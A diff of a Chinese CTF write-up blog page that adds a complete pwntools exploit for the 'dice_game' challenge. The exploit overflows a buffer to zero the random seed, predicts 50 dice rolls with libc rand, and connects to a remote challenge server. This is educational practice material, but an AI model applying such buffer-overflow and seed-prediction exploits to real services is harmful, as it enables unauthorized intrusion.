@@ -92,7 +92,7 @@
 <meta property="og:description" content="自古有一就有二，有二也不一定有三。鸽子才是本质。">
 <meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="https://s2.ax1x.com/2019/08/24/mykjgJ.png">
-<meta property="og:updated_time" content="2019-09-01T08:48:20.075Z">
+<meta property="og:updated_time" content="2019-09-01T11:18:38.159Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="攻防世界自闭之路&lt;二&gt;">
 <meta name="twitter:description" content="自古有一就有二，有二也不一定有三。鸽子才是本质。">
@@ -305,7 +305,7 @@
               
                 <span class="post-meta-item-text">更新于&#58;</span>
               
-              <time title="更新于" itemprop="dateModified" datetime="2019-09-01T16:48:20+08:00">
+              <time title="更新于" itemprop="dateModified" datetime="2019-09-01T19:18:38+08:00">
                 2019-09-01
               </time>
             
@@ -333,7 +333,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  26 字
+                  98 字
                 </span>
               
 
@@ -372,7 +372,10 @@
       
         <p>自古有一就有二，有二也不一定有三。鸽子才是本质。</p>
 <a id="more"></a>
-<h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p> <img src="https://s2.ax1x.com/2019/08/24/mykjgJ.png" alt></p>
+<h1 id="dice-game"><a href="#dice-game" class="headerlink" title="dice_game"></a>dice_game</h1><blockquote>
+</blockquote>
+<h2 id="检查保护"><a href="#检查保护" class="headerlink" title="检查保护"></a>检查保护</h2><p> <img src="https://s2.ax1x.com/2019/08/24/mykjgJ.png" alt></p>
+<h2 id="完整exp"><a href="#完整exp" class="headerlink" title="完整exp"></a>完整exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#p =process("./dice_game")</span></span><br><span class="line">p = remote(<span class="string">"111.198.29.45"</span>,<span class="number">38522</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x40</span> * <span class="string">'A'</span> +p64(<span class="number">0</span>)</span><br><span class="line">p.sendlineafter(<span class="string">":"</span>,payload)</span><br><span class="line"></span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">"/lib/x86_64-linux-gnu/libc.so.6"</span>)</span><br><span class="line">libc.srand(<span class="number">0</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">50</span>):</span><br><span class="line">	p.sendlineafter(<span class="string">":"</span>,str(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
       
     </div>
@@ -564,7 +567,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dice-game"><span class="nav-number">1.</span> <span class="nav-text">dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护"><span class="nav-number">1.1.</span> <span class="nav-text">检查保护</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#dice-game"><span class="nav-number">1.</span> <span class="nav-text">dice_game</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#检查保护"><span class="nav-number">1.1.</span> <span class="nav-text">检查保护</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#完整exp"><span class="nav-number">1.2.</span> <span class="nav-text">完整exp</span></a></li></ol></li></ol></div>
             
 
           </div>
@@ -600,7 +603,7 @@
     
       <span class="post-meta-item-text">Site words total count&#58;</span>
     
-    <span title="Site words total count">5.4k</span>
+    <span title="Site words total count">5.5k</span>
   
 </div>
 
